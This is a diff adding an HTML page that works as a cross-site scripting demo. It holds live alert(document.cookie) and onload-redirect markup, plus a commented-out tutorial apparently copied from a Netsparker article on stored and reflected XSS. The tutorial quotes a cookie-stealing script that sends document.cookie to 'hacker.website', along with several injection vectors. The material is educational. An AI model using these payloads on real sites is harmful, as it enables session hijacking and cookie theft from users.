@@ -1,0 +1,96 @@
+<html>
+<body >
+	<img src="" alt="good" onload="document.location='https://www.google.com/'" />
+	<script>alert(document.cookie);</script>
+	<div>Hi Michael, very gud job, keep it up! </div>
+
+
+
+<!--What are cross-site scripting (XSS ) Attacks?
+
+Cross-site scripting attacks are attacks that target the end user instead of your actual site. Vulnerable web applications that don’t check or validate properly incoming data let arbitrary code to run on a client computer (such as Javascript). The end result can be anything from stealing cookie data or redirecting to a different site, to embedding a browser exploit on a page. Anything that can be done with Javascript (a lot!).
+
+Example of cross-site scripting (xss) attack
+
+Let us suppose that there is a comment form in the Michael’s website of a section like photo gallary or article. He created a feature that let his viewers to comment on his photos or article by submitting a form. And he doesnot have much validation in this comment form.
+
+Now Sam (intruder) visits the Michael‘s website and he’s jealous of Michael‘s website traffic and wants to steal some of his website’s traffic. Then he can insert the follow code to his comment form
+
+Hi Michael, very gud job, keep it up! <img src=”http://google.com/images/logo.gif” onload=”window.location=’http://sam.com/’” />
+
+And every time a user visits Michael’s article or photos, they are rudely redirected to sam’s site.
+
+https://www.netsparker.com/netsparker/ to find out whether the site is hackable or not through this software
+
+
+
+
+What is Cross-site scripting?
+
+Cross-site scripting is a very common injection type web application vulnerability.  By exploiting an XSS vulnerability, a malicious hacker can inject malicious client-side script in a website which is executed by the victims. Typically, cross-site scripting attacks are used to bypass access controls and to impersonate users.
+Examples of Cross-Site Scripting Attacks
+
+There are 2 types of cross-site scripting web application vulnerabilities; stored and reflected. They are also called persistent and non-persistent. Both of them are explained in this article using real life scenario examples.
+Persistent XSS Example Attack (Stored Cross-site scripting)
+
+A persistent cross-site scripting vulnerability is when the attacker provides malicious data to the web application and is stored permanently on a database or some other similar storage. The malicious data is later accessed and executed by the victims without it being filtered or sanitized. This variant of cross-site scripting vulnerability has the largest impact of all when compared to other XSS variants because:
+
+    It will affect every visitor of the targeted web application
+    Unless detected and manually removed, the malicious code will remain active on the website, thus having a very long term effect
+    Web browser’s XSS protection mechanisms do not detect and stop persistent XSS
+
+For this persistent cross-site scripting demo attack imagine a forum web application vulnerable to XSS. The attacker posts a malicious post which is stored in the forums database and is later accessed by the forum administrator. With such an attack the attacker can hijack the forum administrator session and take over control of the forum web application.
+
+To be able to steal the forum administrator cookie the malicious hacker has to redirect the administrator (the victim) to a malicious website which hosts a php script owned by the attacker himself. Once the administrator is redirected to this website, the php script is triggered and copies the administrator’s cookie details and stores them to a file. To redirect the administrator to the malicious website, the malicious hacker posts a malicious forum post similar to the below:
+
+    <script>document.location=http://hacker.website/cookie.php?cookie=” + document.cookie</script>
+
+The above malicious forum post example is explained below:
+
+document.location: This is used to redirecting the victim accessing the forum post
+
+http://hacker.website/cookie.php: The URL where the victim should be redirected to
+
+?cookie=” + document.cookie: This is used to send the victim’s cookie details via a GET request to the malicious script to store it to a file, which is later accessed by the attacker.
+
+Once the script stores the cookie details to a file, it redirects the victim, in this case the forum administrator back to the forums so the user does not notice the strange website behaviour. Once the attacker has the cookie details he can use free tools and browser plugins to use the forum administrator cookie in his browser and access the forum, thus impersonating the administrator. Once the session is hijacked, the attacker can change the administrator account password to invalidate the victim’s session. At this stage the attacker has admin privileges to the forum software and the administrator cannot log back in because his or her password was just changed.
+Non-Persistent XSS Example Attack (Reflective Cross-site scripting)
+
+This is the most commonly exploited cross-site scripting vulnerability and it happens when the data provided by the malicious hacker is immediately used in the response by the server side scripts. Unlike the persistent cross-site scripting vulnerability, this does not have such a wide impact, i.e. it is usually a targeted attack. For this demonstration imagine a vulnerable search form on a website which also displays what the user searched for in the results.
+
+In this case, by using the same code which was used in the persistent XSS attack above as a search term, the malicious hacker can get the web application administrator to access the link to steal the cookie and hijack the session. To convince the administrator to access such a malicious link, the attacker typically sends a fake email with the malicious link which the administrator will most likely access.
+Advanced XSS Attack Vectors
+
+The above examples of persistent and non-persistent cross-site scripting attack variants are the most basic attack vectors. In this case web application developers can simply encode the output according to the output location and context so all active code is treated as data and displayed or filtered, rather than being interpreted as code by the browser.
+
+Today’s web applications are dynamic and a lot of the content is generated on the fly. This means that many objects used in a web application pull and accept data from different sources. For example when viewing a user’s profile on a social network website, the user’s profile page is a template which accepts inputs from different sources to load the user’s information, the profile image and the user’s posts. In this case, if a malicious hacker is able to intercept the input of the profile image function, he can inject malicious code instead of the profile image.
+
+Seasoned malicious hackers are very good at finding these type of attack surfaces and intercepting their inputs to inject them with malicious code. Below are some examples of objects which are typically used in web application templates and accept dynamic input from other sources:
+
+    iframes: <IFRAME SRC="http://hacker.website/cross-site-scripting.html">
+    table: <TABLE BACKGROUND="malicious code">
+    link elements: <LINK REL="stylesheet" HREF="malicious code">
+    Images elements: <img src=”malicous code”>
+    Div elements: <DIV STYLE="width: expression(malicious code)">
+
+To complicate matters a bit more, malicious hackers sometimes encode their malicious code to fool the web application’s input sanitization modules. Several encoding and decoding applications are available for free on the internet, so even a script kiddy can use these sorts of techniques to bypass all sort of input validation and launch a cross-site scripting attack. Hence why simple input filtering is not a good enough solution to protect your web applications from cross-site scripting attacks.
+Impact of Cross-Site Scripting vulnerability
+
+By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged in user’s session. This means that the malicious hacker can change the logged in user’s password and invalidate the session of the victim while the hacker maintains access. As seen from the XSS example in this article, if a web application is vulnerable to cross-site scripting and the administrator’s session is hijacked, the malicious hacker exploiting the vulnerability will have full admin privileges on that web application.
+
+Unfortunately many web developers are still not aware of how big the impact of an exploited cross-site scripting vulnerability can be. In September of 2010, a Cross-site scripting vulnerability in an open source web application used as a bug tracking system by the Apache foundation was exploited and in conjunction with other hacking techniques, the malicious hackers managed to gain root access to the apache.org web servers where the Apache web server source code is stored. If you are interested in the technical details of the Apache.org attack, refer to our blog post XSS to Root in Apache JIRA Incident.
+How to check if your website is vulnerable to XSS attacks
+
+Today’s web applications are becoming very complex and it is impossible to manually identify and check every attack surface of a web application against all XSS attack variants. Therefore it is recommended to use an automated web application security scanner to check if your website is vulnerable to cross-site scripting attacks. An automated web application security scanner such as Netsparker will crawl your website and automatically check if it is vulnerable to cross-site scripting vulnerabilities. If web vulnerabilities are detected, it  will indicate which is the vulnerable URL, script or input parameter so you can easily fix the vulnerability.
+Scanning for Cross-site Scripting Vulnerabilities with Netsparker
+
+Download the trial edition of Netsparker and check if your web applications are vulnerable to cross-site scripting and other web vulnerabilities such as SQL Injection. It only takes a couple of minutes to launch a scan with Netsparker and identify web vulnerabilities in your websites and web applications.
+
+
+
+-->
+
+
+
+</body>
+</html>
